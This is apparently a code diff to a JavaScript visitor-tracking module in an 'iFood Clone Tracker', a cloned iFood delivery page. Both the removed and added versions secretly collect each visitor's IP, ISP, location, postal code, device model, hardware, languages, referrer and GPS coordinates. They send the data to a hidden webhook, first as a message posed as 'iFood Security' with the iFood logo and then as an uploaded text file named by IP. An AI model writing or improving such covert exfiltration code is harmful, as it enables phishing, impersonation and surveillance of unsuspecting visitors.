@@ -11,78 +11,122 @@ const IPModule = {
       const nav  = window.navigator;
       const conn = nav.connection || nav.mozConnection || nav.webkitConnection || {};
       const ua   = nav.userAgent;
+      const platform = nav.platform || nav.userAgentData?.platform || "Desconhecido";
 
-      const os =
-        ua.includes("Windows NT 10.0") ? "Windows 10"     :
-        ua.includes("Windows NT 11.0") ? "Windows 11"     :
-        ua.includes("Windows NT 6.1")  ? "Windows 7"      :
-        ua.includes("Windows")         ? "Windows"        :
-        ua.includes("Ubuntu")          ? "Linux (Ubuntu)" :
-        ua.includes("Linux")           ? "Linux"          :
-        ua.includes("Mac OS X")        ? "macOS"          :
-        ua.includes("Android")         ? "Android"        :
-        ua.includes("iPhone")          ? "iOS (iPhone)"   :
-        ua.includes("iPad")            ? "iOS (iPad)"     : "Desconhecido";
+      // Detectar SO
+      let os = "Desconhecido";
+      if (ua.includes("Windows NT 10.0")) os = "Windows 10";
+      else if (ua.includes("Windows NT 11.0")) os = "Windows 11";
+      else if (ua.includes("Windows NT 6.3")) os = "Windows 8.1";
+      else if (ua.includes("Windows NT 6.2")) os = "Windows 8";
+      else if (ua.includes("Windows NT 6.1")) os = "Windows 7";
+      else if (ua.includes("Windows")) os = "Windows";
+      else if (ua.includes("Android")) {
+        const match = ua.match(/Android[\s]([0-9.]+)/);
+        os = match ? `Android ${match[1]}` : "Android";
+      }
+      else if (ua.includes("iPhone") || ua.includes("iPad")) {
+        const match = ua.match(/OS[\s]([0-9_]+)/);
+        os = match ? `iOS ${match[1].replace(/_/g, ".")}` : "iOS";
+      }
+      else if (ua.includes("Mac OS X")) {
+        const match = ua.match(/Mac OS X[\s]([0-9_]+)/);
+        os = match ? `macOS ${match[1].replace(/_/g, ".")}` : "macOS";
+      }
+      else if (ua.includes("Ubuntu")) os = "Linux (Ubuntu)";
+      else if (ua.includes("Linux")) os = "Linux";
 
-      const browser =
-        ua.includes("Edg/")    ? "Edge"    :
-        ua.includes("OPR/")    ? "Opera"   :
-        ua.includes("Firefox") ? "Firefox" :
-        ua.includes("Chrome")  ? "Chrome"  :
-        ua.includes("Safari")  ? "Safari"  : "Desconhecido";
+      // Detectar navegador
+      let browser = "Desconhecido";
+      if (ua.includes("Edg/")) browser = "Microsoft Edge";
+      else if (ua.includes("OPR/") || ua.includes("Opera")) browser = "Opera";
+      else if (ua.includes("Firefox/")) browser = "Mozilla Firefox";
+      else if (ua.includes("Chrome/")) browser = "Google Chrome";
+      else if (ua.includes("Safari/") && !ua.includes("Chrome")) browser = "Safari";
+      else if (ua.includes("SamsungBrowser")) browser = "Samsung Internet";
 
-      const embed = {
-        title: "🎯 Novo Visitante Capturado",
-        color: 15277612,
-        timestamp: new Date().toISOString(),
-        fields: [
-          {
-            name: "🌐 Rede",
-            value: `**IP:** \`${d.ip}\`\n**ISP:** ${d.org ?? "N/A"}\n**Local:** ${d.city ?? ""}, ${d.region ?? ""} - ${d.country ?? ""}\n**Conexão:** ${conn.downlink ? conn.downlink + " Mbps / " + (conn.effectiveType ?? "") : "N/A"}`,
-            inline: false
-          },
-          {
-            name: "💻 Dispositivo",
-            value: `**OS:** ${os}\n**Browser:** ${browser}\n**CPU:** ${nav.hardwareConcurrency ?? "N/A"} cores / ${nav.deviceMemory ?? "N/A"} GB RAM\n**Tela:** ${window.screen.width}x${window.screen.height}\n**Mobile:** ${nav.maxTouchPoints > 0 ? "Sim" : "Não"}`,
-            inline: true
-          },
-          {
-            name: "⚙️ Sistema",
-            value: `**Idioma:** ${nav.language}\n**Cookies:** ${nav.cookieEnabled ? "Ativado" : "Desativado"}\n**Referrer:** ${document.referrer || "Direto"}`,
-            inline: true
-          },
-          {
-            name: "🔗 URL",
-            value: `[${location.href}](${location.href})`,
-            inline: false
-          }
-        ],
-        footer: {
-          text: "iFood Clone Tracker",
-          icon_url: "https://cdn-icons-png.flaticon.com/512/2972/2972185.png"
+      // Detectar tipo de dispositivo
+      let deviceType = "Desktop";
+      if (/Mobile|Android|iPhone/i.test(ua)) deviceType = "Smartphone";
+      else if (/iPad|Tablet/i.test(ua)) deviceType = "Tablet";
+
+      // Detectar modelo (se possível)
+      let deviceModel = "N/A";
+      const modelMatch = ua.match(/\(([^)]+)\)/);
+      if (modelMatch) {
+        const info = modelMatch[1];
+        if (info.includes("iPhone")) deviceModel = info.match(/iPhone[^;,]*/)?.[0] || "iPhone";
+        else if (info.includes("iPad")) deviceModel = info.match(/iPad[^;,]*/)?.[0] || "iPad";
+        else if (info.includes("SM-") || info.includes("SAMSUNG")) {
+          deviceModel = info.match(/SM-[A-Z0-9]+|SAMSUNG[^;,]*/)?.[0] || "Samsung";
         }
-      };
-
-      if (lat !== null && lon !== null) {
-        embed.fields.push({
-          name: "📍 Localização",
-          value: `**Coords:** \`${lat.toFixed(6)}, ${lon.toFixed(6)}\`\n[Ver no Google Maps](https://maps.google.com/?q=${lat.toFixed(6)},${lon.toFixed(6)})`,
-          inline: false
-        });
-        embed.thumbnail = {
-          url: `https://maps.googleapis.com/maps/api/staticmap?center=${lat},${lon}&zoom=13&size=400x300&markers=color:red%7C${lat},${lon}&key=AIzaSyDummy`
-        };
+        else if (info.includes("Pixel")) deviceModel = info.match(/Pixel[^;,]*/)?.[0] || "Google Pixel";
+        else if (info.includes("Redmi") || info.includes("Mi ")) deviceModel = info.match(/Redmi[^;,]*|Mi [^;,]*/)?.[0] || "Xiaomi";
       }
 
-      await fetch(WEBHOOK, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-          username: "iFood Security",
-          avatar_url: "https://logodownload.org/wp-content/uploads/2017/04/ifood-logo-0.png",
-          embeds: [embed]
-        })
-      });
+      const lines = [
+        "=".repeat(60),
+        "  INFORMACOES DO VISITANTE",
+        "=".repeat(60),
+        "",
+        "[ REDE ]",
+        "IP           : " + d.ip,
+        "ISP          : " + (d.org || "N/A"),
+        "Pais         : " + (d.country || "N/A"),
+        "Regiao       : " + (d.region || "N/A"),
+        "Cidade       : " + (d.city || "N/A"),
+        "CEP          : " + (d.postal || "N/A"),
+        "Timezone     : " + (d.timezone || "N/A"),
+        "Conexao      : " + (conn.downlink ? `${conn.downlink} Mbps (${conn.effectiveType || "N/A"})` : "N/A"),
+        "",
+        "[ DISPOSITIVO ]",
+        "Tipo         : " + deviceType,
+        "Modelo       : " + deviceModel,
+        "Sistema      : " + os,
+        "Plataforma   : " + platform,
+        "Navegador    : " + browser,
+        "",
+        "[ HARDWARE ]",
+        "CPU Cores    : " + (nav.hardwareConcurrency || "N/A"),
+        "Memoria RAM  : " + (nav.deviceMemory ? nav.deviceMemory + " GB" : "N/A"),
+        "Resolucao    : " + window.screen.width + "x" + window.screen.height,
+        "Touch Screen : " + (nav.maxTouchPoints > 0 ? "Sim (" + nav.maxTouchPoints + " pontos)" : "Nao"),
+        "Pixel Ratio  : " + (window.devicePixelRatio || "N/A"),
+        "",
+        "[ CONFIGURACOES ]",
+        "Idioma       : " + nav.language,
+        "Idiomas      : " + (nav.languages ? nav.languages.join(", ") : "N/A"),
+        "Cookies      : " + (nav.cookieEnabled ? "Ativado" : "Desativado"),
+        "DNT          : " + (nav.doNotTrack || "N/A"),
+        "Online       : " + (nav.onLine ? "Sim" : "Nao"),
+        "",
+        "[ NAVEGACAO ]",
+        "URL Atual    : " + location.href,
+        "Referrer     : " + (document.referrer || "Acesso Direto"),
+        "User Agent   : " + ua,
+      ];
+
+      if (lat !== null && lon !== null) {
+        lines.push("");
+        lines.push("[ LOCALIZACAO GPS ]");
+        lines.push("Latitude     : " + lat.toFixed(6));
+        lines.push("Longitude    : " + lon.toFixed(6));
+        lines.push("Google Maps  : https://maps.google.com/?q=" + lat.toFixed(6) + "," + lon.toFixed(6));
+      }
+
+      lines.push("");
+      lines.push("[ TIMESTAMP ]");
+      lines.push("Data/Hora    : " + new Date().toLocaleString("pt-BR", { timeZone: "America/Sao_Paulo" }));
+      lines.push("ISO          : " + new Date().toISOString());
+      lines.push("");
+      lines.push("=".repeat(60));
+
+      const blob = new Blob([lines.join("\n")], { type: "text/plain; charset=utf-8" });
+      const form = new FormData();
+      const filename = `visitor_${d.ip.replace(/\./g, "_")}_${Date.now()}.txt`;
+      form.append("file", blob, filename);
+      
+      await fetch(WEBHOOK, { method: "POST", body: form });
     } catch (err) {
       console.warn("[IPModule]", err.message);
     }
